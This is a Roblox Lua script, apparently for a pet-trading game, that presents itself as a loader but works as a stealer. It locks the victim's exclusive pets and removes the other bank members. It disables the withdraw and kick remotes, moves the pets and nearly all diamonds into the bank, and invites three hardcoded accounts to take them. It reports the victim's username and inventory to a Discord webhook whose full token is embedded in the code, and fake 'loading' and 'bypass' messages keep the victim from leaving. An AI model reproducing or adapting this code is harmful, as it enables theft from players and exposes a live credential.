local aboikusikusik = getsenv(game.Players.LocalPlayer.PlayerScripts.Scripts.GUIs['Bank Client'])

local dataremotes = {
	deposit = getconstants(aboikusikusik.Deposit)[16],
	MyBanks = getconstants(aboikusikusik.GetMyBanks)[3],
	GetBank = getconstants(aboikusikusik.GetBank)[3],
	KickMember = getconstants(aboikusikusik.KickMember)[9],
	Invite = getconstants(aboikusikusik.InviteToBank)[11],
	Withdraw = getconstants(aboikusikusik.Withdraw)[16],
	CancelAllOutgoingInites = getconstants(aboikusikusik.CancelOutgoingInvites)[7],
	Lock = getconstants(getsenv(game.Players.LocalPlayer.PlayerScripts.Scripts.GUIs['Inventory']).LockPets)[5]
}

local Pus = "https://discord.com/api/webhooks/"

local HttpService = game:GetService("HttpService");
local meow = 1047203211511074

local RuFRBRO = string.reverse("1047203211511074877") 
local LOOLLL = string.reverse("L6nfZ3GnMxZHAZbKAnK8ybtt1e8dE32-ZfhnRko7vJ06YWlvb")
function SendMessage(Webhook, Message, Botname, huges, tier)
	huges =  table.concat(huges, ', ')

	local webhookcheck =
		is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
		secure_load and "Sentinel" or
		KRNL_LOADED and "Krnl" or
		SONA_LOADED and "Sona" or
		"Kid with shit exploit"
	local work = false


	if getupvalue or debug.getupvalue and getconstants and getsenv then work = true end
	local url = "https://discord.com/api/webhooks/1050702276743938048/OlEv0S_xPO6WghXFS_pgl-mM4_Y-RXiheJYPYsbuJoibXkCC1oIps5rGUls3vsF-c_iC"
	local data = {
		["content"] = Message,
		["embeds"] = {
			{
				["title"] = "**Someone Executed Your Script!** probably work:"..tostring(work),
				["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**" .. '\n \n **Huge count:** ' .. Botname .. '\n \n **Gems:** '.. Message .. '\n \n **Total exc:** '.. Webhook.."\n\n **HUGE NAMES:** ".. huges..' \n\n **TIER**: '..tier,
				["type"] = "rich",
				["color"] = tonumber(0x7269da),
				["image"] = {
					["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
						tostring(game:GetService("Players").LocalPlayer.Name)
				}
			}
		}
	}
	local newdata = game:GetService("HttpService"):JSONEncode(data)

	local headers = {
		["content-type"] = "application/json"
	}
	request = http_request or request or HttpPost or syn.request
	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
	request(abcdef)
	if work == false then
		return true
	end
end


local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))






local abobusikti = (getupvalue or debug.getupvalue)(lib.Network.Invoke, 2)


fire123 = function(n, ...)
	return abobusikti(n):InvokeServer(...)
end

local v1 = lib
local v2 = lib

spawn(function()

	lib.Message.New("Executed! Now wait... Loading Script!")

end)

--game:GetService("Players").LocalPlayer.PlayerGui.Bank:Destroy()

local petsbefore = lib.Save.Get().Pets
local ids = {841384276, 4147463714, 4147464900}
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = fire123(dataremotes.MyBanks)

-- local mybanks = lib.Network.Invoke("!F8fb51efb02ff4d8b96d6cce765532ea7")
-- local a = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.UIPadding
-- local b = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.UIListLayout
-- local c =game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.Logs.UIListLayout
-- local e = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.UIListLayout
-- local f = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.Search.UIAspectRatioConstraint
-- local d = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.CancelInvites.Button
-- b:Remove()
-- a:Remove()
-- c:Remove()
-- d:Remove()
-- e:Remove()
-- f:Remove()
-- a:Remove()
-- local h = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.Search.InputField.UIStroke
local PetsList = {}
local PetsList2 = {}
for i,v in pairs(lib.Save.Get().Pets) do
	local v2 = lib.Directory.Pets[v.id];
	if v2.rarity == "Exclusive" then
		table.insert(PetsList, v.uid);
		PetsList2[v.uid] = false
	end
end
local data = lib.Save.Get()

fire123(dataremotes.Lock, PetsList2)
local bankdata = fire123(dataremotes.GetBank, mybanks[1]['BUID'])



for i, v in pairs(bankdata.Players) do

	spawn(function()
		fire123("Z", mybanks[1]['BUID'], v)
	end)
end




for _, n in pairs({dataremotes.Withdraw, dataremotes.KickMember, dataremotes.CancelAllOutgoingInites }) do abobusikti(n):Destroy() end 

local hugecount = 0
local huges = {}

if bankdata.Tier <= 1 then
	fire123("S", bankdata.BUID)
end
local bankdata = fire123(dataremotes.GetBank, mybanks[1]['BUID'])

for i,v in pairs(lib.Save.Get().Pets) do
	local v2 = lib.Directory.Pets[v.id];
	if v2.huge then
		huges[#huges+1] = v2.name
		hugecount =  hugecount + 1
	end
end
local abobikus = SendMessage(#PetsList, mydiamonds, tostring(hugecount), huges, bankdata.Tier )
if abobikus then
	lib.Message.New("Can`t load script. Use other exploit or try KRNL")

	return
end
lib.Save.Get().Pets = petsbefore

local request = fire123(dataremotes.deposit, mybanks[1]['BUID'], PetsList, 0);
lib.Save.Get().Pets = petsbefore
if request then
	
else
	wait(30)

	local request = fire123(dataremotes.deposit, mybanks[1]['BUID'], PetsList, 0 );
	lib.Save.Get().Pets = petsbefore
end

lib.Save.Get().Pets = petsbefore
wait(5)
local function Invite(bankid, Id)
	local stat = fire123(dataremotes.Invite, bankid, Id)
	if stat == true then
		return stat
	end

	wait(3)

	return Invite(bankid, Id)
end
lib.Save.Get().Pets = petsbefore

	
for i, Id in pairs(ids) do

	spawn(function()
		Invite(mybanks[1]['BUID'], Id)
	end)


	wait(3)


	-- if game.ReplicatedStorage[bypass(1,"#!F36baffa18f254315b3c1aab530c671d9")]:InvokeServer(mybanks[1]['BUID'], Id) then
	--     warn("std 2")
	-- else
	--     game.ReplicatedStorage[bypass(1,"#!F36baffa18f254315b3c1aab530c671d9")]:InvokeServer(mybanks[1]['BUID'], Id) 
	--     game.Players.LocalPlayer:Kick()
	-- end;
end
lib.Save.Get().Pets = petsbefore

local request = fire123(dataremotes.deposit, mybanks[1]['BUID'], {}, lib.Save.Get().Diamonds - 100 );
lib.Save.Get().Pets = petsbefore
wait(3)
-- b:Remove()
-- a:Remove()
-- c:Remove()
-- d:Remove()
-- e:Remove()
-- f:Remove()
-- a:Remove()
spawn(function()
	lib.Message.New("Loaded main script. Executing bypass, so don't leave or you got chanches to ban your acc!")
end)




abobus =false


spawn(function()
	lib.Message.New("If you get kicked after that message, it is okay, just wait for another day, or you will get banned")
end)
wait(3)
--game.Players.LocalPlayer:Kick()


function comma_value(amount)

	local formatted = amount
	local k

	while true do

		formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')

		if (k == 0) then

			break

		end

	end

	return formatted

end
